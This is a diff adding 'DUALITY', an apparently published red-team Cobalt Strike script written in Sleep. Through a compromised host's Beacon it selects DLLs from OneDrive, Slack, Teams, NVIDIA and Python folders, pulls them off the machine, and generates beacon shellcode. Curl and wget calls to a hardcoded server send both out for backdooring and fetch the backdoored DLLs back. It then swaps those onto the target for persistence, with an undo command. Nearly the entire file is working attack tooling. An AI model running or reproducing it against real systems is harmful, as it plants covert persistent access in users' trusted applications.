@@ -1,0 +1,328 @@
+#
+# Copyright 2024 Aon plc
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+# http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+#
+ 
+
+# Author: primal0xF7 (Faisal Tameesh)
+# Description: Operationalizing DUALITY through Cobalt Strike
+# Note:
+#   All this code needs serious cleanup and more closure-minded programming.
+#   I learned a lot about Sleep (the language, I lost real sleep though) as I was writing this - apologies if your eyes bleed.
+#   With that said, welcome to lambda hell! :D
+#
+#       "I push these lambdas into my... EYEEEEEEES" - Duality by Slipknot
+#       "...Jesus, these lambdas never end, they work their way inside"
+
+$weburl = "http://192.168.69.33";
+
+
+# List of potential paths. 
+$progArray = array(
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\Microsoft\\OneDrive\\23.007.0109.0004\\FileSyncShell64.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\Temp\\4d202cc0-9402-4ce4-bd9f-acd794791215.tmp.node",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\NVIDIA\\NvBackend\\ApplicationOntology\\Ontology64.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\Microsoft\\OneDrive\\23.007.0109.0004\\FileCoAuthLib64.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\slack\\app-4.29.149\\ffmpeg.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\slack\\app-4.29.149\\D3DCompiler_47.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\slack\\app-4.29.149\\libglesv2.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\slack\\app-4.29.149\\libegl.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\slack\\app-4.29.149\\vk_swiftshader.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\Microsoft\\Teams\\current\\ffmpeg.dll",
+"C:\\Users\\SOMEDUALITYUSER\\AppData\\Local\\Programs\\Python\\Python310\\python310.dll");
+
+on ready {
+    elog("DUALITY persistence technique loaded. Use command 'DUALITY' to persist.");
+}
+
+sub exec_command {
+    $beaconid = $1;
+    blog2($1, "Executing " . $2);
+    $fcommand = exec($2);                  
+    if (checkError($error)) {
+        warn("Error: " . $error);
+    }
+    @commandOutput = readAll($fcommand);
+    closef($fcommand);
+    return @commandOutput;
+}
+
+alias("DUALITY", {
+
+    # Switch id to this var because $1 will change meanings shortly...
+    #   where's my I <3 SLEEP shirt... here we go...
+    $beaconid = $1;
+
+    # Get the current username
+    $username = binfo($beaconid, "user");
+    if("*" isin binfo($beaconid, "user")) {
+        $username = left($username, size($username)-2);
+    }   
+
+    blog($beaconid, "[DUALITY] Searching for possible PEs / DLLs to backdoor...");
+
+    # Define an empty array to store the valid paths
+    @validPaths = @();
+    $oks = 0;
+
+    openPayloadHelper(lambda({
+        $selectedListener = $1; 
+        # Look for potential DLLs to backdoor from provided list above
+        foreach $progPath ($progArray) {
+            $progPath = replace($progPath, "SOMEDUALITYUSER", $username);
+            @progItemList = split("\\\\", $progPath);
+            $progName = pop(@progItemList);
+            $progDir = join("\\", @progItemList);
+
+            bls($beaconid, $progDir, lambda({
+
+                $results = lc($3);              
+                $progN = lc($progN);
+                $progP = lc($progP);
+                $progDir = lc($progDir);
+
+                if($progN isin $results) {
+                    add(@validPaths, $progP);
+                }
+
+                $oks = $oks + 1;            
+                if($oks == (size($progArray))) {
+                    $viewString = "";
+                    foreach $idx => $location (@validPaths) {
+                        $viewString = $viewString . $idx . " - " . $location . "\n";
+                    }
+                    prompt_text("\nEnter one or more DLLs to backdoor. For more than one DLL, separate with spaces, i.e. \"3 5 6 9\" to backdoor 4 DLLs at those indices.\n\n" . $viewString . "\n\n", "0", {
+                        @chosenDLLs = split(" ", $1);
+                        @chosenDLLPaths = @();
+
+                        $viewString = "";
+                        foreach $idx => $chosenIdx (@chosenDLLs) {
+                            $viewString = $viewString . @validPaths[$chosenIdx] . "\n";
+                            add(@chosenDLLPaths, @validPaths[$chosenIdx]);
+                        }
+
+                        # Confirm operator choice 
+                        prompt_confirm("You will backdoor the following DLL(s). Are you sure?\n\n" . $viewString, "Confirm", {
+                            $timeBeforeDL = ticks();
+                            foreach $chosenDLLPath (@chosenDLLPaths) {
+                                bdownload($beaconid, $chosenDLLPath);
+                            }
+
+
+                            blog($beaconid, "Operator, please standby... don't perform any other actions until backdooring is complete.");
+
+                            @downloadedFiles = @();
+
+                            # Wait until it's actually downloaded
+                            $sleepDuration = 1000; # Sleep ms between download checks
+                            $DLComplete = 0;
+                            while ($DLComplete < size(@chosenDLLPaths)) {
+                                $DLComplete = 0;
+                                @downloadedFiles = @();
+                                foreach $DLItem (downloads()) {
+                                    $longdate = casti($DLItem["date"], 'l');
+                                    if($longdate >= $timeBeforeDL) {
+                                        $DLComplete = $DLComplete + 1;
+                                        add(@downloadedFiles, $DLItem);
+                                    }
+                                }
+                                sleep($sleepDuration);
+                            }
+                            blog($beaconid, "Downloads are complete. Syncing files to local machine...");
+                            
+                            # Come up with some prefix for the files to sync
+                            @numList = @("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+                            $prefix = ""; 
+                            for($idx = 0; $idx < 20; $idx++) { 
+                                $prefix = $prefix . rand(@numList);
+                            }
+
+                            # Let's write our shellcode file out now that we have a prefix
+                            $scFileHandle = openf(">" . script_resource($prefix . "_____sc.bin"));
+                            $rawScData = payload($selectedListener, "x64", "process");
+                            writeb($scFileHandle, $rawScData);
+       
+                            $syncedFiles = 0;
+
+                            @localFilePaths = @();
+
+                            foreach $dlFile (@downloadedFiles) {
+                                # Sync downloads down to client
+                                $localFilePath = script_resource($prefix . "_____" . $dlFile['path'] . $dlFile['name']);
+                                $localFilePath = replace($localFilePath, "\\\\", "-_-");
+                                $localFilePath = replace($localFilePath, ":", "-__-");
+                                push(@localFilePaths, $localFilePath);
+                                sync_download($dlFile["lpath"], $localFilePath, lambda({
+                                    $syncedFiles = $syncedFiles + 1;
+                                    #blog($beaconid, "syncedfiles: " . $syncedFiles);
+                                    #blog($beaconid, "size dlls: " . size(@chosenDLLPaths));
+
+                                    if($syncedFiles == size(@chosenDLLPaths)) {
+                                        blog($beaconid, "All files synced");    
+
+
+                                        # Send the files off to get backdoored
+                                        # curl -F 'file=@./test1.txt' -F 'file=@./test2.txt' 'http://duality.primalcerebral.com/'
+
+                                        # You'll need to be careful with SUPER long paths (~260 chars).
+                                        # Very low chance you'll run into an issue, but the program ends up on a Windows machine
+                                        #   somewhere so the MAX_PATH is something to think about.
+                                        @webCommand = @("/usr/bin/curl", "-v");
+                                        push(@webCommand, "-F");
+                                        push(@webCommand, "file=@" . script_resource($prefix . "_____sc.bin"));
+                                        foreach $localFileP (@lfPaths) {
+                                            push(@webCommand, "-F");
+                                            push(@webCommand, "file=@" . $localFileP);
+                                        }
+
+                                        push(@webCommand, $weburl . "/");
+                                        if("Success!" !isin exec_command($beaconid, @webCommand)) {
+                                            warn($beaconid, "Upload failed");
+                                            return;
+                                        }
+
+                                        blog($beaconid, "Files uploaded");
+
+                                        sleep(5000);
+                                        while(true) {
+                                            @webCommand = @("/usr/bin/curl", "-v", $weburl . "/");
+                                            $output = exec_command($beaconid, @webCommand);
+                                            
+                                            if (($prefix . "_done.txt") isin $output) {
+                                                blog($beaconid, "Compilation complete - prefix: " . $prefix);
+                                                break;
+                                            }
+
+                                            sleep(1000);
+                                        }
+
+                                        blog($beaconid, "Downloading backdoored DLLs");
+
+                                        foreach $dllToDl (@chosenDLLPaths) {
+                                            blog($beaconid, "first " . $dllToDl);
+                                            $tempdllToDl = $dllToDl;
+                                            $tempdllToDl = replace($tempdllToDl, "\\\\", "-_-");
+                                            $tempdllToDl = replace($tempdllToDl, ":", "-__-");
+                                            $tempdllToDl = $prefix . "_____" . $tempdllToDl;
+                                            blog($beaconid, "Downloading: " . $tempdllToDl);
+                                            @webCommand = @("/usr/bin/wget", "-O", script_resource($tempdllToDl), $weburl . "/" . $tempdllToDl);
+                                            exec_command($beaconid, @webCommand)
+                                        }
+
+                                        blog($beaconid, "Uploading backdoored DLLs to target machine");
+
+                                        foreach $dllToDl (@chosenDLLPaths) {
+                                            $ogProgPath = $dllToDl;
+                                            $dllToDl = replace($dllToDl, "\\\\", "-_-");
+                                            $dllToDl = replace($dllToDl, ":", "-__-");
+                                            $dllToDl = $prefix . "_____" . $dllToDl;
+
+                                            @progPath = split('\\\\', $ogProgPath);
+                                            $OGProgName = pop(@progPath);
+                                            $OGProgDir = join("\\", @progPath);
+
+                                            blog($beaconid, "ogprogpath " . $ogProgPath);
+                                            blog($beaconid, "dlltodl " . $dllToDl);
+                                            blog($beaconid, "ogprogname " . $OGProgName);
+                                            blog($beaconid, "ogprogdir " . $OGProgDir);
+
+                                            bcd($beaconid, $OGProgDir);
+                                            @changeNameCommand = @("/usr/bin/mv", script_resource($dllToDl), script_resource($OGProgName));
+                                            exec_command($beaconid, @changeNameCommand);
+                                            blog($beaconid, "Removing backup file in case it exists, no worries if error");
+                                            brm($beaconid, $OGProgName. ".csbak");
+                                            bmv($beaconid, $OGProgName, $OGProgName . ".csbak");
+                                            bupload($beaconid, script_resource($OGProgName));
+                                        }
+
+                                        blog($beaconid, "DUALITY procedures complete");
+                                    } 
+                                    else {
+                                        blog($beaconid, "Files left to sync: " . (size(@chosenDLLPaths) - $syncedFiles));
+                                    }
+                                }, @lfPaths => @localFilePaths));
+                            }
+
+                        });
+                    });
+                }
+      
+            }, $progP => $progPath, $progN => $progName));
+        }
+    }))
+});
+
+@outputs = @();
+@progDirs = @();
+@progNames = @();
+$beaconidOut = "";
+
+alias("UNDUALITY", {
+    $beaconid = $1;
+    $dirCounter = 0;
+    # Get the current username
+    $username = binfo($beaconid, "user");
+    if("*" isin binfo($beaconid, "user")) {
+        $username = left($username, size($username)-2);
+    }   
+    blog($beaconid, "About to remove duals");
+
+
+    foreach $ogDualityProgPath ($progArray) {
+
+        $ogProgPath = replace($ogDualityProgPath, "SOMEDUALITYUSER", $username);
+
+        @progPath = split('\\\\', $ogProgPath);
+        $OGProgName = pop(@progPath);
+        $OGProgDir = join("\\", @progPath); 
+
+        bls($beaconid, $OGProgDir, lambda({
+            add(@progDirs, $OGProgD);
+            add(@progNames, $OGProgN);
+            add(@outputs, lc($3));
+            $beaconidOut = $beaconid;
+            callcc &checkResults;
+        }, $OGProgD => $OGProgDir, $OGProgN => $OGProgName));
+    }
+});
+
+sub checkResults {
+    $results = @outputs[0];
+    $progDir = @progDirs[0];
+    $progName = @progNames[0];
+
+    @numList = @("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+    $prefix = ""; 
+    for($idx = 0; $idx < 20; $idx++) { 
+        $prefix = $prefix . rand(@numList);
+    }
+
+    if(($progName . ".csbak") isin $results) {
+        # Yeet the backdoored version to a unique suffix  
+        bmv($beaconidOut, $progDir . "\\" . $progName, $progDir . "\\" . $progName . "-" . $prefix);
+
+        # Try to delete it but it might fail if prog is open, no prob, will get removed on next program update
+        brm($beaconidOut, $progDir . "\\" . $progName . "-" . $prefix); 
+
+        # Try to delete the ".bak" file that the DUALITY logic creates to be able to overwrite the original while it's running
+        brm($beaconidOut, $progDir . "\\" . $progName . ".bak");
+
+        bmv($beaconidOut, $progDir . "\\" . $progName . ".csbak", $progDir . "\\" . $progName);
+        blog($beaconidOut, "Undualed " . $progDir . "\\" . $progName);
+    }
+    pop(@outputs);
+    pop(@progDirs);
+    pop(@progNames);
+    [$1];
+}
